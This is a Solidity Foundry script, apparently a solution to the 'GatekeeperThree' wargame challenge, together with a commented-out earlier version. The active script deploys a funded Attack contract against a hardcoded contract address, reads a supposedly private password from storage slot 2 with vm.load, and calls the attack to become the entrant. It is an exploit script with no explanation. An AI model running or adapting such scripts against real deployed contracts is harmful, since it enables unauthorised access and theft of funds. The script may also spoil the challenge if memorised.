// SPDX-License-Identifier: UNLICENSED
// pragma solidity ^0.8.13;

// import {Script, console} from "forge-std/Script.sol";
// import {GatekeeperThree, SimpleTrick} from "../src/GatekeeperThree.sol";
// import {Attack} from "../src/Attack.sol";

// contract AttackScript is Script {
//     address public gateKeeper;
//     SimpleTrick public simpleTrick;
//     Attack attack;

//     function setUp() public {}

//     function run() public {

//         vm.startBroadcast();

//         gateKeeper = 0x2744328CE8434473824D1bf4FC145656BfB03510;

//         attack = new Attack{value: 0.0011 ether}(payable(gateKeeper)); // also funds the contract otherwise u will get out of funds revert error

//         simpleTrick = attack.simpleTrick();

//         // console.log("attack.simpleTrick() : ", address(attack.simpleTrick()));

//         bytes32 password = vm.load(address(simpleTrick), bytes32(uint256(2)));
        
//         // console.log("attack.simpleTrick() : ", password);

//         // attack.attack(password);

//         console.log("Entrant : ", attack.gateKeeper().entrant());

//         vm.stopBroadcast();
//     }
// }


pragma solidity ^0.8.20;

import {Script, console2} from "forge-std/Script.sol";
import {Attack} from "../src/Attack.sol";

contract AttackScript is Script {
    address gateKeepperThree = 0x7300dAF2239f0591De4BF83a444021D8171a57f8;

    function run() external {
        vm.startBroadcast();

        Attack attack = new Attack{
            value: 0.0011 ether
        }(gateKeepperThree);

        address trick = attack.trick();
        bytes32 pwd = vm.load(trick, bytes32(uint256(2)));

        console2.log("Attacker : ", tx.origin);
        console2.log("Attacker : ", address(attack));

        console2.log("Password: ", uint256(pwd));

        attack.attack(pwd);
        console2.log("Entrant : ", attack.keeper().entrant());

        vm.stopBroadcast();
    }
}